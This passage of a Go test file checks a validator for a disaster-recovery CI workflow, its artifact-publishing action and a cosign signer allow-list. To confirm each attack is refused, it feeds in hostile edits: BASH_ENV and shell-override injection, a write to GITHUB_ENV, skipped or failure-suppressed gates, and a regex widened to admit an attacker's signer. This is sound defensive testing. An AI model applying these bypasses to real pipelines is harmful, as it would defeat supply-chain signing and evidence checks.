		"workflow scope": {{"defaults": map[string]any{"run": map[string]any{"shell": "bash {0}"}}}, nil, {}},
		"job scope":      {nil, {"defaults": map[string]any{"run": map[string]any{"shell": "bash {0}"}}}, {}},
		"step scope":     {nil, nil, {"shell": "bash {0}"}},
	} {
		if err := refuseShellOverride(scoped[0], scoped[1], scoped[2], "j"); err == nil {
			t.Fatalf("a shell override at %s must be refused", name)
		}
	}

	// envAllowsOnly: same per-scope structure, plus the property an allowlist
	// can quietly lose. The POSITIVE control comes first deliberately — a
	// helper that refused every env would satisfy each negative case below
	// while making a legitimate gate unshippable, so "rejects the payload" and
	// "still accepts what is permitted" are two different claims and both are
	// asserted.
	if err := envAllowsOnly(
		map[string]any{"env": map[string]any{"GOFLAGS": "-mod=readonly"}},
		map[string]any{"env": map[string]any{"GOFLAGS": "-mod=readonly"}},
		map[string]any{"env": map[string]any{"GOFLAGS": "-mod=readonly"}},
		"j", []string{"GOFLAGS"},
	); err != nil {
		t.Fatalf("an allow-listed variable must be accepted at every scope: %v", err)
	}
	if err := envAllowsOnly(map[string]any{}, map[string]any{}, map[string]any{}, "j", nil); err != nil {
		t.Fatalf("a gate that sets no env at all must be accepted: %v", err)
	}
	for name, scoped := range map[string][3]map[string]any{
		"workflow scope": {{"env": map[string]any{"BASH_ENV": "s.sh"}}, nil, {}},
		"job scope":      {nil, {"env": map[string]any{"BASH_ENV": "s.sh"}}, {}},
		"step scope":     {nil, nil, {"env": map[string]any{"BASH_ENV": "s.sh"}}},
		// A shape the helper cannot parse still reaches the shell, so reading
		// it as absent would accept exactly the payload this refuses.
		"unreadable shape": {nil, nil, {"env": "BASH_ENV=s.sh"}},
	} {
		if err := envAllowsOnly(scoped[0], scoped[1], scoped[2], "j", nil); err == nil {
			t.Fatalf("an env override at %s must be refused", name)
		}
	}

	// gateJobRunsOnlyItsValidator: the validator step itself is the ONE run
	// step, so the positive control has to include it — a helper that refused
	// every run step would pass every negative case and refuse the real gate.
	validatorStep := map[string]any{"run": "go run ./x\n"}
	if err := gateJobRunsOnlyItsValidator(
		map[string]any{"steps": []any{
			map[string]any{"uses": "actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0"},
			map[string]any{"uses": "actions/setup-go@924ae3a1cded613372ab5595356fb5720e22ba16"},
			validatorStep,
		}}, "j", gateStepActions,
	); err != nil {
		t.Fatalf("the real gate job's step list must be accepted: %v", err)
	}
	for name, steps := range map[string][]any{
		"a second run step": {validatorStep, map[string]any{"run": "echo BASH_ENV=s.sh >> \"$GITHUB_ENV\"\n"}},
		"an unlisted action": {
			map[string]any{"uses": "some/action@v1"}, validatorStep,
		},
		"a step this check cannot read": {"- run: true", validatorStep},
	} {
		if err := gateJobRunsOnlyItsValidator(map[string]any{"steps": steps}, "j", gateStepActions); err == nil {
			t.Fatalf("%s must be refused", name)
		}
	}
}

// drPublisherStep is the DR rebuild's publisher step, byte-exact. The ablations
// below replace this whole block so each one MOVES the mechanism rather than
// deleting it: the text the old scanning check looked for survives somewhere the
// workflow does not execute it, which is the only shape that separates a scan
// from a parse. An ablation that merely deleted the step would be refused by
// both implementations and would prove nothing.
const drPublisherStep = `      - name: 📦 Publish evidenced manifests to GHCR
        id: publish_platform_manifest
        uses: ./.github/actions/deploy-prod/publish-platform-manifests
        with:
          ghcr-token: ${{ secrets.GHCR_TOKEN }}
          hcloud-token: ${{ secrets.HCLOUD_TOKEN }}
`

func TestDRWorkflowContractRejectsEachAblation(t *testing.T) {
	t.Parallel()

	workflow := repoFile(t, ".github/workflows/dr-rebuild.yaml")
	cases := []struct {
		name    string
		old     string
		new     string
		wantErr string
	}{
		{
			name:    "without id-token the job cannot mint a Fulcio certificate",
			old:     "      id-token: write # keyless cosign signing (Fulcio OIDC)\n",
			wantErr: "id-token: write",
		},
		{
			name:    "without packages permission the transaction cannot publish",
			old:     "      packages: write # push OCI artifacts to GHCR\n",
			wantErr: "packages: write",
		},
		{
			name:    "without attestations permission evidence cannot be written",
			old:     "      attestations: write # write SBOM + SLSA provenance attestations\n",
			wantErr: "attestations: write",
		},
		{
			name:    "a permission granted as read does not authorise the transaction",
			old:     "      packages: write # push OCI artifacts to GHCR\n",
			new:     "      packages: read # push OCI artifacts to GHCR\n",
			wantErr: "packages: write",
		},
		{
			name:    "without the shared action DR can drift from normal deploy",
			old:     "uses: ./.github/actions/deploy-prod/publish-platform-manifests",
			new:     "uses: ./.github/actions/other-publisher",
			wantErr: "shared publication action",
		},
		{
			name: "the publisher text survives in a COMMENT while another action runs",
			old:  drPublisherStep,
			new: `      - name: 📦 Publish evidenced manifests to GHCR
        id: publish_platform_manifest
        # uses: ./.github/actions/deploy-prod/publish-platform-manifests
        uses: ./.github/actions/other-publisher
        with:
          ghcr-token: ${{ secrets.GHCR_TOKEN }}
          hcloud-token: ${{ secrets.HCLOUD_TOKEN }}
`,
			wantErr: "shared publication action",
		},
		{
			name: "the publisher text survives in a BLOCK SCALAR while nothing invokes it",
			old:  drPublisherStep,
			new: `      - name: 📦 Publish evidenced manifests to GHCR
        id: publish_platform_manifest
        run: |
          echo "uses: ./.github/actions/deploy-prod/publish-platform-manifests"
          echo "ghcr-token: ${{ secrets.GHCR_TOKEN }}"
          echo "hcloud-token: ${{ secrets.HCLOUD_TOKEN }}"
`,
			wantErr: "shared publication action",
		},
		{
			name: "credentials named on a DIFFERENT step never reach the publisher",
			old:  drPublisherStep,
			new: `      - name: 📦 Publish evidenced manifests to GHCR
        id: publish_platform_manifest
        uses: ./.github/actions/deploy-prod/publish-platform-manifests

      - name: 🔑 Unrelated step that merely names the credentials
        run: |
          echo "ghcr-token: ${{ secrets.GHCR_TOKEN }}"
          echo "hcloud-token: ${{ secrets.HCLOUD_TOKEN }}"
`,
			wantErr: "publication credentials",
		},
		{
			name: "one credential present and the other missing is still unpublishable",
			old:  drPublisherStep,
			new: `      - name: 📦 Publish evidenced manifests to GHCR
        id: publish_platform_manifest
        uses: ./.github/actions/deploy-prod/publish-platform-manifests
        with:
          ghcr-token: ${{ secrets.GHCR_TOKEN }}
`,
			wantErr: "hcloud-token",
		},
		{
			name: "a SKIPPED publisher step leaves the workflow reading as correct",
			old:  drPublisherStep,
			new: `      - name: 📦 Publish evidenced manifests to GHCR
        id: publish_platform_manifest
        if: false
        uses: ./.github/actions/deploy-prod/publish-platform-manifests
        with:
          ghcr-token: ${{ secrets.GHCR_TOKEN }}
          hcloud-token: ${{ secrets.HCLOUD_TOKEN }}
`,
			wantErr: "declares a condition",
		},
		{
			name: "a FAILURE-SUPPRESSED publisher step discards its own verdict",
			old:  drPublisherStep,
			new: `      - name: 📦 Publish evidenced manifests to GHCR
        id: publish_platform_manifest
        continue-on-error: true
        uses: ./.github/actions/deploy-prod/publish-platform-manifests
        with:
          ghcr-token: ${{ secrets.GHCR_TOKEN }}
          hcloud-token: ${{ secrets.HCLOUD_TOKEN }}
`,
			wantErr: "continue-on-error",
		},
		{
			name:    "a renamed rebuild job hides the whole contract",
			old:     "\n  rebuild:\n",
			new:     "\n  rebuild-renamed:\n",
			wantErr: "missing rebuild job",
		},
	}

	for _, testCase := range cases {
		t.Run(testCase.name, func(t *testing.T) {
			t.Parallel()
			ablated := strings.ReplaceAll(workflow, testCase.old, testCase.new)
			if ablated == workflow {
				t.Fatalf("ablation changed nothing — the control does not target a real line")
			}
			err := validateDRWorkflow(ablated)
			if err == nil || !strings.Contains(err.Error(), testCase.wantErr) {
				t.Fatalf("wrong result: got %v, want error mentioning %q", err, testCase.wantErr)
			}
		})
	}
}

// TestDRPermissionsAreReadFromTheParsedGrantNotItsComment pins the direction the
// scanning check got wrong in the SAFE-looking way: it compared each permission
// against a whole line INCLUDING its trailing comment, so rewording the comment
// broke the gate while the grant itself was untouched. A contract that fails on
// a documentation edit trains people to weaken it.
func TestDRPermissionsAreReadFromTheParsedGrantNotItsComment(t *testing.T) {
	t.Parallel()

	workflow := repoFile(t, ".github/workflows/dr-rebuild.yaml")
	reworded := strings.ReplaceAll(
		workflow,
		"      id-token: write # keyless cosign signing (Fulcio OIDC)",
		"      id-token: write # mints the Fulcio certificate for keyless signing",
	)
	if reworded == workflow {
		t.Fatal("ablation changed nothing — the control does not target a real line")
	}
	if err := validateDRWorkflow(reworded); err != nil {
		t.Fatalf("rewording a permission's comment must not break the contract: %v", err)
	}
}

// TestDRWorkflowFailsClosedOnShapesItCannotRead covers the shapes a parser can
// meet that a scanner never did. Each must be REFUSED rather than skipped: this
// decides whether a disaster-recovery publish is trusted, so a grant this cannot
// read must not fall through to accepted.
func TestDRWorkflowFailsClosedOnShapesItCannotRead(t *testing.T) {
	t.Parallel()

	workflow := repoFile(t, ".github/workflows/dr-rebuild.yaml")
	for _, testCase := range []struct {
		name    string
		old     string
		new     string
		wantErr string
	}{
		{
			name: "permissions collapsed to a blanket scalar names no specific grant",
			old: `    permissions:
      contents: read # checkout repository
      packages: write # push OCI artifacts to GHCR
      id-token: write # keyless cosign signing (Fulcio OIDC)
      attestations: write # write SBOM + SLSA provenance attestations
`,
			new:     "    permissions: write-all\n",
			wantErr: "permissions",
		},
		{
			name:    "a workflow that does not parse cannot establish anything",
			old:     "\n  rebuild:\n",
			new:     "\n  rebuild:\n    : : :\n",
			wantErr: "does not parse",
		},
	} {
		t.Run(testCase.name, func(t *testing.T) {
			t.Parallel()
			ablated := strings.ReplaceAll(workflow, testCase.old, testCase.new)
			if ablated == workflow {
				t.Fatal("ablation changed nothing — the control does not target a real line")
			}
			err := validateDRWorkflow(ablated)
			if err == nil || !strings.Contains(err.Error(), testCase.wantErr) {
				t.Fatalf("wrong result: got %v, want error mentioning %q", err, testCase.wantErr)
			}
		})
	}
}

func TestPublicationActionRejectsEachAblation(t *testing.T) {
	t.Parallel()

	publisher := repoFile(t, ".github/actions/deploy-prod/publish-platform-manifests/action.yml")
	cases := []struct {
		name    string
		old     string
		new     string
		wantErr string
	}{
		{
			name:    "without a unique staging tag concurrent runs share mutable bytes",
			old:     `STAGING_TAG="staging-${GITHUB_SHA}-${GITHUB_RUN_ID}-${GITHUB_RUN_ATTEMPT}"`,
			new:     `STAGING_TAG="latest"`,
			wantErr: "unique staging reference",
		},
		{
			name:    "without a staging push there is nothing immutable to evidence",
			old:     `workload push "${STAGING_OCI_REF}"`,
			new:     `echo skip-push`,
			wantErr: "staging reference",
		},
		{
			name:    "without the environment bridge an expression reaches shell code",
			old:     "        STAGING_OCI_REF: ${{ steps.staging_reference.outputs.oci_ref }}\n",
			wantErr: "environment bridge",
		},
		{
			name:    "without signing the promoted bytes are unverifiable",
			old:     `cosign sign --yes --recursive "ghcr.io/devantler-tech/platform/manifests@${STAGING_DIGEST}"`,
			new:     `echo skip-signing`,
			wantErr: "without signing",
		},
		{
			name:    "signing latest reintroduces a mutable-tag race",
			old:     `ghcr.io/devantler-tech/platform/manifests@${STAGING_DIGEST}`,
			new:     `ghcr.io/devantler-tech/platform/manifests:latest`,
			wantErr: "resolved staging digest",
		},
		{
			name:    "without SBOM generation the attestation has no inventory",
			old:     "syft scan ",
			new:     "echo skip-sbom ",
			wantErr: "missing SBOM generation",
		},
		{
			name:    "SBOM generation must inspect the same immutable digest",
			old:     `registry:ghcr.io/devantler-tech/platform/manifests@${STAGING_DIGEST}`,
			new:     `registry:ghcr.io/devantler-tech/platform/manifests:latest`,
			wantErr: "resolved staging digest",
		},
		{
			name:    "the SBOM output must match the attestation input",
			old:     "--output cyclonedx-json=sbom.cdx.json",
			new:     "--output spdx-json=other.json",
			wantErr: "CycloneDX SBOM",
		},
		{
			name:    "without an SBOM attestation latest lacks required evidence",
			old:     "uses: actions/attest@",
			new:     "uses: actions/skip-attest@",
			wantErr: "SBOM attestation",
		},
		{
			name:    "without provenance latest lacks required evidence",
			old:     "uses: actions/attest-build-provenance@",
			new:     "uses: actions/skip-provenance@",
			wantErr: "provenance attestation",
		},
		{
			name:    "without digest-preserving promotion latest can name new bytes",
			old:     "docker buildx imagetools create --prefer-index=false",
			new:     "docker buildx imagetools create",
			wantErr: "digest-preserving",
		},
		{
			name:    "without post-promotion equality latest may name other bytes",
			old:     `if [[ "${LATEST_DIGEST}" != "${STAGING_DIGEST}" ]]; then`,
			new:     `if false; then`,
			wantErr: "verify latest",
		},
	}

	for _, testCase := range cases {
		t.Run(testCase.name, func(t *testing.T) {
			t.Parallel()
			ablated := strings.ReplaceAll(publisher, testCase.old, testCase.new)
			if ablated == publisher {
				t.Fatalf("ablation changed nothing — the control does not target a real line")
			}
			err := validatePublicationAction(ablated)
			if err == nil || !strings.Contains(err.Error(), testCase.wantErr) {
				t.Fatalf("wrong result: got %v, want error mentioning %q", err, testCase.wantErr)
			}
		})
	}
}

func TestPublicationActionRequiresVerifiedToolInstaller(t *testing.T) {
	t.Parallel()

	publisher := repoFile(t, ".github/actions/deploy-prod/publish-platform-manifests/action.yml")
	// The absent installer is also the baseline defect: the publisher delegates
	// downloads to actions that do not enforce a repository-local binary digest.
	withoutInstaller := strings.ReplaceAll(publisher,
		"run: .github/scripts/setup-supply-chain-tools.sh", "run: echo no-verified-tools")
	err := validatePublicationAction(withoutInstaller)
	if err == nil || !strings.Contains(err.Error(), "verified supply-chain tools") {
		t.Fatalf("publisher without verified supply-chain tools was accepted: %v", err)
	}
}

// TestPublicationActionRejectsSuppressedPublicationSteps pins the half of the
// contract that ordering cannot see.
//
// 🔴 THE SAME CLASS AS enforcesFailure's job-level check, ONE LEVEL FURTHER
// DOWN — inside the composite action's own steps, where every existing check
// was blind. `continue-on-error: true` on `verify_evidence` leaves the step
// present, in the right place, invoked with the right digest, reading
// ENFORCE=true — so the ordering chain, the wiring test, and the enforcement
// ratchet all still pass — while the gate's verdict is discarded and
// `promote_latest` moves the mutable tag onto bytes carrying no usable
// evidence. Position proves a step is reached; it says nothing about whether
// its failure stops the run.

func TestPublicationActionRejectsSuppressedPublicationSteps(t *testing.T) {
	t.Parallel()

	publisher := repoFile(t, ".github/actions/deploy-prod/publish-platform-manifests/action.yml")
	cases := []struct {
		name     string
		stepID   string
		injected string
		wantErr  string
	}{
		{
			name:     "a discarded evidence verdict promotes unevidenced bytes",
			stepID:   "verify_evidence",
			injected: "      continue-on-error: true",
			wantErr:  "continue-on-error",
		},
		{
			name:     "a suppressed signature failure promotes unsigned bytes",
			stepID:   "cosign_sign",
			injected: "      continue-on-error: true",
			wantErr:  "continue-on-error",
		},
		{
			name:     "a suppressed provenance failure promotes bytes lacking evidence",
			stepID:   "attest_provenance",
			injected: "      continue-on-error: true",
			wantErr:  "continue-on-error",
		},
		{
			name:     "a conditional gate can be skipped while the action still reads as gated",
			stepID:   "verify_evidence",
			injected: "      if: always()",
			wantErr:  "condition",
		},
		{
			name:     "a conditional promotion can run on a path the contract never checked",
			stepID:   "promote_latest",
			injected: "      if: always()",
			wantErr:  "condition",
		},
	}

	for _, testCase := range cases {
		t.Run(testCase.name, func(t *testing.T) {
			t.Parallel()
			anchor := "      id: " + testCase.stepID
			ablated := strings.Replace(publisher, anchor, anchor+"\n"+testCase.injected, 1)
			if ablated == publisher {
				t.Fatalf("ablation changed nothing — no step carries id %q", testCase.stepID)
			}
			err := validatePublicationAction(ablated)
			if err == nil || !strings.Contains(err.Error(), testCase.wantErr) {
				t.Fatalf("wrong result: got %v, want error mentioning %q", err, testCase.wantErr)
			}
			if !strings.Contains(fmt.Sprint(err), testCase.stepID) {
				t.Fatalf("error does not name the offending step %q: %v", testCase.stepID, err)
			}
		})
	}
}

func TestPublicationActionRejectsPromotionBeforeEvidence(t *testing.T) {
	t.Parallel()

	publisher := repoFile(t, ".github/actions/deploy-prod/publish-platform-manifests/action.yml")
	// Move the whole promotion step in front of the provenance step, so the
	// parsed chain — not a line of text — carries the ordering defect.
	const provenance = "    - name: 🪪 Attest build provenance"
	const promotion = "    - name: 🚀 Promote the evidenced digest to latest"
	before, promoteStep, found := strings.Cut(publisher, promotion)
	if !found || strings.Contains(promoteStep, "\n    - ") {
		t.Fatalf("the promotion step must be the last step for this reordering to hold")
	}
	head, tail, found := strings.Cut(before, provenance)
	if !found {
		t.Fatalf("the provenance step is missing from the shipped publisher")
	}
	publisher = head + promotion + strings.TrimRight(promoteStep, "\n") + "\n\n" + provenance + tail
	if _, err := decodeWorkflow(publisher); err != nil {
		t.Fatalf("reordered publisher must stay valid YAML: %v", err)
	}

	err := validatePublicationAction(publisher)
	if err == nil || !strings.Contains(err.Error(), "before promotion") {
		t.Fatalf("promotion before provenance was accepted: %v", err)
	}
}

// ablateShippedMatcher replaces whichever permitted subject the shipped config
// carries with the given replacement.
//
// The ablations below must not name one permitted form directly. The config
// legitimately ships either the three-signer alternation or the DR identity
// alone, so a test pinned to one of them silently stops ablating anything the
// day the other is adopted — which is exactly what happened when the allow-list
// collapsed to a single shared entry: the substitution matched nothing, the
// ablation became a no-op, and it was the "changed nothing" guard rather than
// the assertion that caught it. Failing loudly when no permitted form is
// present keeps that guard.
func ablateShippedMatcher(t *testing.T, config string, replacement string) string {
	t.Helper()

	for _, permitted := range permittedSubjects {
		if strings.Contains(config, permitted) {
			return strings.ReplaceAll(config, permitted, replacement)
		}
	}

	t.Fatal("ablation changed nothing — the shipped config carries no permitted DR matcher to remove")

	return ""
}

func TestVerifyAllowListRejectsAMissingDRIdentity(t *testing.T) {
	t.Parallel()

	config := repoFile(t, "ksail.prod.yaml")
	ablated := ablateShippedMatcher(t, config, `^https://example\.invalid$`)
	if err := validateVerifyAllowList(ablated); err == nil {
		t.Fatal("allow-list without the DR identity was accepted")
	}
}

// allowListConfig builds a minimal cluster config carrying one matchOIDCIdentity
// entry at the given dotted path, so the path tests below differ in exactly one
// variable: where the verify block sits.
func allowListConfig(path string, issuer string, subject string) string {
	var builder strings.Builder
	builder.WriteString("apiVersion: ksail.io/v1alpha1\nkind: Cluster\n")
	indent := ""
	for _, key := range strings.Split(path, ".") {
		builder.WriteString(indent + key + ":\n")
		indent += "  "
	}
	builder.WriteString(indent + "provider: cosign\n")
	builder.WriteString(indent + "matchOIDCIdentity:\n")
	builder.WriteString(indent + "  - issuer: '" + issuer + "'\n")
	builder.WriteString(indent + "    subject: '" + subject + "'\n")
	return builder.String()
}

// This is the positive control for the three path/shape ablations that follow.
// Without it, any of them could pass merely because the synthetic YAML is
// malformed — a rejection for the wrong reason is indistinguishable from a
// rejection for the right one.
func TestVerifyAllowListAcceptsTheDRIdentityAtThePathKSailReads(t *testing.T) {
	t.Parallel()

	config := allowListConfig("spec.workload.flux.verify", drIdentityIssuer, drIdentitySubject)
	if err := validateVerifyAllowList(config); err != nil {
		t.Fatalf("the DR identity at the path KSail reads was rejected: %v", err)
	}
}

// The bypass #2945 measured: a comment has no effect on the cluster, so a gate
// satisfied by one certifies an allow-list that is not in effect.
func TestVerifyAllowListRejectsACommentedDRIdentity(t *testing.T) {
	t.Parallel()

	config := repoFile(t, "ksail.prod.yaml")
	removed := ablateShippedMatcher(t, config, `^https://example\.invalid$`)
	bypassed := removed + "\n# " + drIdentitySharedSubject + "\n"
	if err := validateVerifyAllowList(bypassed); err == nil {
		t.Fatal("a commented-out DR identity was accepted as an allow-list entry")
	}
}

// The second shape #2945 records: the whole block at a path KSail discards.
// spec.cluster.verify is exactly the #2627 outage.
func TestVerifyAllowListRejectsAVerifyBlockAtAPathKSailDiscards(t *testing.T) {
	t.Parallel()

	config := allowListConfig("spec.cluster.verify", drIdentityIssuer, drIdentitySubject)
	err := validateVerifyAllowList(config)
	if err == nil {
		t.Fatal("a verify block at spec.cluster.verify — a path KSail discards — was accepted")
	}
	// Assert WHICH failure this is. Without this the test would also pass if the
	// synthetic config were merely malformed, which would prove nothing about the
	// path being discarded.
	if !strings.Contains(err.Error(), "no cosign matchOIDCIdentity entries") {
		t.Fatalf("rejected for the wrong reason — expected zero entries at the read path, got: %v", err)
	}
}

// A substring match is blind in the LENGTHENING direction, and that direction is
// dangerous here: `^dr$|^evil$` contains the DR identity and also allows a
// second signer.
func TestVerifyAllowListRejectsASubjectThatMerelyContainsTheDRIdentity(t *testing.T) {
	t.Parallel()

	widened := drIdentitySubject + `|^https://github\.com/attacker/repo/\.github/workflows/x\.yaml@refs/heads/main$`
	config := allowListConfig("spec.workload.flux.verify", drIdentityIssuer, widened)
	if err := validateVerifyAllowList(config); err == nil {
		t.Fatal("a widened subject regex that merely contains the DR identity was accepted")
	}
}

// The lengthening attack, aimed at the form production actually ships. The test
// above widens the DR-only matcher; this one widens the three-signer
// alternation, which is the entry a pull request would really be editing. A
// check that evaluated the regex against the DR identity would pass here — the
// widened expression still admits the DR rebuild — which is why the comparison
// stayed exact.
func TestVerifyAllowListRejectsAWidenedSharedMatcher(t *testing.T) {
	t.Parallel()

	widened := strings.TrimSuffix(drIdentitySharedSubject, `$`) +
		`|^https://github\.com/attacker/repo/\.github/workflows/x\.yaml@refs/heads/main$`
	config := allowListConfig("spec.workload.flux.verify", drIdentityIssuer, widened)

	err := validateVerifyAllowList(config)
	if err == nil {
		t.Fatal("a widened three-signer matcher admitting an extra signer was accepted")
	}
	// Rejected for the RIGHT reason: the exact comparison, not a parse failure.
	if !strings.Contains(err.Error(), "is exactly a permitted DR") {
		t.Fatalf("rejected for the wrong reason — expected the exact-match refusal, got: %v", err)
	}
}

// The constants themselves are the remaining single point of failure: a
// permitted form is compared against the shipped config, so a mistake baked
// into the constant agrees with itself forever and the gate keeps passing.
// verifyPermittedSubject is what notices, so assert it on every permitted form
// rather than only the one production happens to ship.
func TestPermittedSubjectsAdmitTheDRIdentityAndRefuseUntrustedSigners(t *testing.T) {
	t.Parallel()

	if len(permittedSubjects) == 0 {
		t.Fatal("no permitted subjects to check — the allow-list contract would admit nothing")
	}

	for _, permitted := range permittedSubjects {
		if err := verifyPermittedSubject(permitted); err != nil {
			t.Errorf("permitted subject %s is not a correct matcher: %v", permitted, err)
		}
	}

	if err := verifyPermittedIssuer(drIdentityIssuer); err != nil {
		t.Errorf("permitted issuer %s is not a correct matcher: %v", drIdentityIssuer, err)
	}
}

// A correct entry buried in a longer list. cosign fails CLOSED on a multi-entry
// matchOIDCIdentity, so the second entry does not add a signer — it removes
// every one of them, and the DR artifact stops verifying. A check that returned
// as soon as it found a permitted entry would call this configuration fine.
func TestVerifyAllowListRejectsAPermittedEntryAmongSeveral(t *testing.T) {
	t.Parallel()

	single := allowListConfig("spec.workload.flux.verify", drIdentityIssuer, drIdentitySharedSubject)
	// Positive control: the same entry ALONE must pass, so the rejection below
	// is attributable to the extra entry and not to the synthetic YAML.
	if err := validateVerifyAllowList(single); err != nil {
		t.Fatalf("the permitted entry alone was rejected, so this test proves nothing: %v", err)
	}

	// allowListConfig indents two spaces per path segment, so a four-segment
	// path puts the list items ten spaces in. Derive it rather than hard-coding
	// the depth, or this test breaks the day the path changes.
	itemIndent := strings.Repeat("  ", len(strings.Split("spec.workload.flux.verify", "."))+1)
	twoEntries := single +
		itemIndent + "- issuer: '" + drIdentityIssuer + "'\n" +
		itemIndent + "  subject: '" + drIdentitySubject + "'\n"

	err := validateVerifyAllowList(twoEntries)
	if err == nil {
		t.Fatal("a permitted entry alongside a second entry was accepted, but cosign verifies neither")
	}
	if !strings.Contains(err.Error(), "supports exactly ONE") {
		t.Fatalf("rejected for the wrong reason — expected the multi-entry refusal, got: %v", err)
	}
}

// The issuer half of the pair, with the same two ablations the subject guard
// gets: a matcher that admits nobody, and one that admits everybody. Without
// these the issuer guard could pass while asserting nothing.
func TestPermittedIssuerGuardFiresInBothDirections(t *testing.T) {
	t.Parallel()

	if err := verifyPermittedIssuer(`^https://example\.invalid$`); err == nil {
		t.Fatal("an issuer that does not match GitHub's OIDC provider was accepted")
	}

	if err := verifyPermittedIssuer(`^.*$`); err == nil {
		t.Fatal("a catch-all issuer was accepted, so the issuer over-breadth guard never fires")
	}
}

// The positive control for the test above: it passes only because the untrusted
// subjects are genuinely refused, not because the list is empty or the matcher
// refuses everything. A matcher that admitted nothing would also "refuse" them.
func TestUntrustedSubjectsAreDistinguishedFromTheRealOne(t *testing.T) {
	t.Parallel()

	if len(untrustedSubjects) == 0 {
		t.Fatal("no untrusted subjects — the over-breadth guard would assert nothing")
	}

	for _, untrusted := range untrustedSubjects {
		if untrusted == drIdentitySubjectLiteral {
			t.Errorf("untrusted subject %s IS the real DR identity, so the guard contradicts itself", untrusted)
		}
	}

	// An anchored `.*` admits everything, so it must fail — proving the guard
	// can fail at all, rather than passing because nothing exercises it.
	if err := verifyPermittedSubject(`^.*$`); err == nil {
		t.Fatal("a catch-all subject was accepted, so the over-breadth guard never fires")
	}
}

// An OIDC identity is the issuer/subject PAIR. A correct subject under a
// different issuer does not match the DR signature, so it must not satisfy the
// gate either.
func TestVerifyAllowListRejectsTheDRSubjectUnderTheWrongIssuer(t *testing.T) {
	t.Parallel()

	config := allowListConfig("spec.workload.flux.verify", `^https://accounts\.google\.com$`, drIdentitySubject)
	if err := validateVerifyAllowList(config); err == nil {
		t.Fatal("the DR subject under a non-GitHub issuer was accepted")
	}
}

func TestRunReportsSuccessAndFailure(t *testing.T) {
	t.Parallel()

	workflowPath := filepath.Join("..", "..", ".github", "workflows", "dr-rebuild.yaml")
	configPath := filepath.Join("..", "..", "ksail.prod.yaml")

	var stdout, stderr bytes.Buffer
	if code := run(workflowPath, configPath, &stdout, &stderr); code != 0 {
		t.Fatalf("run on the real repository failed: code=%d stderr=%s", code, stderr.String())
	}
	if !strings.Contains(stdout.String(), "DR publication contract passed.") {
		t.Fatalf("missing success line: %q", stdout.String())
	}

	stdout.Reset()
	stderr.Reset()
	missing := filepath.Join(t.TempDir(), "missing.yaml")
	if code := run(missing, configPath, &stdout, &stderr); code != 1 {
		t.Fatalf("unreadable workflow should exit 1, got %d", code)
	}
	if !strings.Contains(stderr.String(), "read workflow") {
		t.Fatalf("missing read-failure diagnostic: %q", stderr.String())
	}
}

func TestRunCLIRequiresBothPaths(t *testing.T) {
	t.Parallel()

	var stdout, stderr bytes.Buffer
	if code := runCLI([]string{"only-one"}, &stdout, &stderr); code != 2 {
		t.Fatalf("expected usage exit 2, got %d", code)
	}
	if !strings.Contains(stderr.String(), "usage: validate-dr-signing") {
		t.Fatalf("missing usage line: %q", stderr.String())
	}
}

// TestMergeQueueContractGateIsEnforced covers the merge-queue route's VALIDATOR
// step, which the route check previously left entirely unconstrained.
//
// 🔴 EVERY ARM ASSERTS THE REASON, NOT JUST THE REFUSAL. These ablations edit
// YAML, so a mis-indented arm produces a parse error — and `validateProductionRoutes`
// refuses an unparseable workflow. An arm checking only `err == nil` would then
// pass while proving nothing about the rule it names, which is the exact vacuity
// this file has been bitten by before. Matching the message keeps each arm
// pinned to its own mechanism.
func TestMergeQueueContractGateIsEnforced(t *testing.T) {
	t.Parallel()

	ci := repoFile(t, ".github/workflows/ci.yaml")
	if err := validateProductionRoutes(ci); err != nil {
		t.Fatalf("shipped ci.yaml fails the merge-queue gate rules: %v", err)
	}

	const (
		stepName      = "      - name: \U0001F58B️ Validate DR signing contract\n"
		validatorLine = "          go run ./scripts/validate-dr-signing .github/workflows/dr-rebuild.yaml ksail.prod.yaml\n"
		testLine      = "          go test ./scripts/validate-dr-signing\n"
		gateJobHeader = "  validate-publication-contract:\n"
		deployNeeds   = `    needs:
      [
        changes,
        validate-eks-authorization,
        validate-publication-contract,
        validate-talos,
        validate-rgd-templates-merge-group,
        validate-ghcr-fanout-merge-group,
      ]`
		deployNeedsWithoutGate = `    needs:
      [
        changes,
        validate-eks-authorization,
        validate-talos,
        validate-rgd-templates-merge-group,
        validate-ghcr-fanout-merge-group,
      ]`
		healNeeds = "    needs: [changes, deploy-prod, validate-publication-contract]"
	)

	for name, arm := range map[string]struct {
		ablate func(string) string
		reason string
	}{
		// (1) Located by the same command equality cd.yaml uses.
		"validator command absent from the gate job": {
			func(s string) string { return strings.Replace(s, validatorLine, "", 1) },
			"does not EXECUTE",
		},
		// (2) Enforced: neither skipped nor failure-suppressed, at either level.
		"validator step is skipped": {
			func(s string) string { return strings.Replace(s, stepName, stepName+"        if: false\n", 1) },
			"declares a condition",
		},
		"validator step suppresses failure": {
			func(s string) string {
				return strings.Replace(s, stepName, stepName+"        continue-on-error: true\n", 1)
			},
			"continue-on-error",
		},
		"gate job suppresses failure": {
			func(s string) string {
				return strings.Replace(s, gateJobHeader, gateJobHeader+"    continue-on-error: true\n", 1)
			},
			"continue-on-error",
		},
		// (2) Straight-line: an extra command line can leave the validator present
		// while the shell never reaches it.
		"gate run block carries an extra command": {
			func(s string) string { return strings.Replace(s, testLine, "          echo skipped\n"+testLine, 1) },
			"which is not one of the commands this gate may contain",
		},
		// (2) No shell override at any of the three scopes GitHub applies.
		"shell overridden at step scope": {
			func(s string) string { return strings.Replace(s, stepName, stepName+"        shell: bash {0}\n", 1) },
			"overrides the shell",
		},
		"shell overridden at gate-job scope": {
			func(s string) string {
				return strings.Replace(s, gateJobHeader, gateJobHeader+"    defaults:\n      run:\n        shell: bash {0}\n", 1)
			},
			"job sets defaults.run.shell",
		},
		"shell overridden at workflow scope": {
			func(s string) string {
				return strings.Replace(s, "\njobs:\n", "\ndefaults:\n  run:\n    shell: bash {0}\njobs:\n", 1)
			},
			"the workflow sets defaults.run.shell",
		},
		// (2) No inherited environment: BASH_ENV shadows `go` before the run block
		// executes, so the allowlisted lines stay correct and run nothing.
		"gate step inherits an environment variable": {
			func(s string) string {
				return strings.Replace(s, stepName, stepName+"        env:\n          BASH_ENV: /tmp/shadow\n", 1)
			},
			"which the publication-contract gate may not inherit",
		},
		// (3) Production must WAIT for the job that carries the validator — and
		// EVERY production job needs its own arm.
		//
		// 🔴 One arm covering only deploy-prod is not coverage of the rule, it is
		// coverage of one iteration of it. The check runs inside the loop over
